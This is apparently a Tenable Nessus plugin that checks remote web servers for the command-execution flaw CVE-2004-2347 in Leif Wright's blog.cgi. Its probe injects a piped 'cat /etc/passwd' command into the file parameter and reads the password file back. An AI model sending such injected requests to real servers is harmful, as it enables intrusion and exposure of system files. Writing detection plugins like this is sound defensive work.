#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(12033);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2004-2347");
 script_bugtraq_id(9539);
 script_osvdb_id(3793);
 
 script_name(english:"Leif Wright Web Blog blog.cgi ViewFile Request file Parameter Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is hosting a CGI application that is affected by
a remote command execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LeifWright's blog.cgi - a CGI designed to
handle personal web logs (or 'blogs'). 

There is a bug in this software that could allow an attacker to execute
arbitrary commands on the remote web server with the privileges of the
web user." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/352303/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2004/02/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/01/29");
 script_cvs_date("$Date: 2011/12/09 19:21:17 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 summary["english"] = "Checks for command execution in LeifWright's blog.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
  res = http_send_recv3(method:"GET", item:string(dir,"/blog.cgi?submit=ViewFile&month=01&year=2004&file=|cat%20/etc/passwd|"), port:port, exit_on_fail: 1);

  if(egrep(pattern:".*root:.*:0:[01]:.*", string:res[2])){
    security_hole(port);
    exit(0);
  }
}
